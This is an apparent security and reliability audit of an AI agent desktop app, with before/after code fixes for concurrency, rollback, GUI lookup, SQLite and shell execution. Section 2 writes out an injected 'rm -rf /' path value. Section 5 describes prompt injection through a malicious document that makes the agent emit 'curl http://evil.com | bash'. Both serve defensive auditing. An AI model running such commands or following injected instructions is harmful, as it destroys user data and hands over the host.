# Technical Audit Report: Sovereign AI OS

## 1. Race Conditions (Tauri <-> Python/Rust bridge)
**The Bug**: In `src-tauri/src/commands.rs`, `execute_mission` iterates over `brain_res.plan` and calls `run_tool(step.tool.clone(), step.params.clone())`. `run_tool` is entirely synchronous and blocking. It executes filesystem operations (`std::fs::write`, `std::fs::read_to_string`), GUI traversals (`GuiEngine::get_ui_hierarchy()`), and arbitrary shell commands (`ExecutionEngine::shell_execute`) directly on the async executor thread because it isn't spawned via `tauri::async_runtime::spawn_blocking`. Moreover, if multiple missions run simultaneously, there's no mutex/locking mechanism to prevent interleaved, conflicting tool executions (e.g., clicking the GUI while another task is typing).

**The Risk**: The Tauri async runtime can become completely deadlocked if long-running operations block its threads. Concurrent GUI operations will interfere with each other, corrupting the OS state, causing missed events, or producing completely unpredictable behavior.

**The Surgical Fix**:
```rust
Before:
        // Run the tool and catch errors for Saga Rollback
        match run_tool(step.tool.clone(), step.params.clone()) {
            Ok(_) => continue,
            Err(e) => {
After:
        // Run the tool in a blocking task to prevent locking the async runtime
        let tool = step.tool.clone();
        let params = step.params.clone();

        // A global mutex should be added here in a production fix to serialize GUI access
        let tool_result = tauri::async_runtime::spawn_blocking(move || {
            run_tool(tool, params)
        }).await.unwrap_or_else(|e| Err(format!("Task panic: {:?}", e)));

        // Catch errors for Saga Rollback
        match tool_result {
            Ok(_) => continue,
            Err(e) => {

```

## 2. Saga Integrity (Rollback Logic)
**The Bug**: In `apps/api/src/tools/toolExecutor.ts`, the `undoAction` method implements the inverse of `create_folder` using string interpolation inside a shell command: `undoArgs = { command: \`rm -rf "${action.undo_params.path}"\` };`. There is no sanitization of `action.undo_params.path`. It is highly vulnerable to command injection and is not deterministic. For example, if a directory wasn't completely empty and contained prior user data, it wipes everything instead of restoring state. For `write_file`, it assumes `action.undo_params.original_content` is stored directly in the DB, which isn't actually being collected (it hardcodes `'...'` in `calculateUndoParams`).

**The Risk**: Command Injection and Data Loss. A malicious or hallucinatory path like `"/some/path"; rm -rf /` will result in the entire filesystem being deleted by `rm -rf`. A failed `undo` action completely corrupts the user's hard drive instead of cleanly rolling back.

**The Surgical Fix**:
```typescript
Before:
      case 'create_folder':
        // Inverse of create_folder is a recursive delete (use shell_execute for simplicity)
        undoTool = 'shell_execute';
        undoArgs = { command: `rm -rf "${action.undo_params.path}"` };
        break;
After:
      case 'create_folder':
        // Inverse of create_folder must use a safe, deterministic deletion API, NOT a raw shell command
        undoTool = 'delete_folder'; // Replace with an actual Node.js fs.rm or safe tool
        undoArgs = { path: action.undo_params.path };
        break;

```

## 3. AX Tree Fragility (GUI Control)
**The Bug**: In `src-tauri/src/gui_engine.rs`, the GUI elements are traversed and identified solely by `AXRole` and `AXTitle`. The `click_element` method takes a `_label: &str` indicating elements are found strictly by their visible text (`title`).

**The Risk**: If the application is localized into another language, the window focus changes unexpectedly, or two elements share the exact same `AXTitle` (e.g., two "Submit" buttons), the system will fail or click the wrong element. This is extremely brittle for an Accessibility API.

**The Surgical Fix**:
```rust
Before:
        let mut title: CFTypeRef = ptr::null_mut();
        let title_attr = CFString::from_static_string("AXTitle");
        AXUIElementCopyAttributeValue(element, title_attr.as_CFTypeRef(), &mut title);

        let role_str = if role.is_null() { "Unknown" } else { "Element" };
        let title_str = if title.is_null() { "" } else { " - Title: ..." };

        let indent = "  ".repeat(depth);
        output.push_str(&format!("{}{} [{}] {}\n", indent, if depth == 0 { "🏁" } else { "🔹" }, role_str, title_str));
After:
        let mut title: CFTypeRef = ptr::null_mut();
        let title_attr = CFString::from_static_string("AXTitle");
        AXUIElementCopyAttributeValue(element, title_attr.as_CFTypeRef(), &mut title);

        let mut identifier: CFTypeRef = ptr::null_mut();
        let id_attr = CFString::from_static_string("AXIdentifier");
        AXUIElementCopyAttributeValue(element, id_attr.as_CFTypeRef(), &mut identifier);

        let role_str = if role.is_null() { "Unknown" } else { "Element" };
        let title_str = if title.is_null() { "" } else { " - Title: ..." };
        let id_str = if identifier.is_null() { "" } else { " - ID: ..." }; // Real implementation would extract the string

        let indent = "  ".repeat(depth);
        output.push_str(&format!("{}{} [{}] {}{}\n", indent, if depth == 0 { "🏁" } else { "🔹" }, role_str, title_str, id_str));

```

## 4. Memory Leaks (SQLite-vec / Rust bridge)
**The Bug**: In `src-tauri/src/memory.rs`, the methods `save_interaction`, `add_knowledge`, and `search_memory` call `Connection::open(&self.db_path)?` on every single query without utilizing a connection pool. Because of the `sqlite3_auto_extension(Some(std::mem::transmute(sqlite3_vec_init as *const ())))` call in `new()`, and the nature of `sqlite-vec` initialization, repeatedly opening and tearing down raw SQLite connections is resource-intensive. More importantly, concurrent threads calling `Connection::open` on the same file can easily result in `database is locked` errors, leaking resources or crashing the local Vector memory layer.

**The Risk**: Connection exhaustion, degraded performance, and `database is locked` errors causing total failure of semantic recall capabilities.

**The Surgical Fix**:
```rust
Before:
pub struct MemoryManager {
    db_path: PathBuf,
}

impl MemoryManager {
    pub fn new(app: &AppHandle) -> Self {
After:
use std::sync::Mutex;

pub struct MemoryManager {
    db_path: PathBuf,
    conn: Mutex<Connection>,
}

impl MemoryManager {
    pub fn new(app: &AppHandle) -> Self {

```
*(Note: Full fix requires modifying all methods to lock and use `self.conn` rather than `Connection::open`)*

## 5. Security Holes (Prompt Injection via `shell_execute`)
**The Bug**: In `src-tauri/src/execution_engine.rs`, the `shell_execute` method implements unrestricted arbitrary command execution via `Command::new("sh").arg("-c").arg(command).output()`. Since the Multi-Agent Orchestrator (Brain) takes raw LLM outputs and passes them directly to tool execution, an adversary could prompt inject the LLM (e.g., via a loaded malicious document) to output a `shell_execute` plan containing malicious payloads like `curl http://evil.com | bash`.

**The Risk**: Complete host takeover. A prompt injection attack completely bypasses the Brain's safety guardrails because the native Rust bridge executes whatever it's given as a raw shell string with the user's local permissions.

**The Surgical Fix**:
```rust
Before:
    /// SHELL EXECUTE
    /// Guarded shell execution.
    pub fn shell_execute(command: &str) -> Result<String, String> {
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd").args(["/C", command]).output()
        } else {
            Command::new("sh").arg("-c").arg(command).output()
        };
After:
    /// SHELL EXECUTE
    /// Guarded shell execution.
    pub fn shell_execute(command: &str) -> Result<String, String> {
        // Implement a strict allowlist or sandbox for shell commands
        let allowed_commands = ["ls", "echo", "pwd", "date"];
        let base_cmd = command.split_whitespace().next().unwrap_or("");

        if !allowed_commands.contains(&base_cmd) {
            return Err(format!("Command '{}' blocked by Security Policy.", base_cmd));
        }

        let output = if cfg!(target_os = "windows") {
            Command::new("cmd").args(["/C", command]).output()
        } else {
            Command::new("sh").arg("-c").arg(command).output()
        };

```
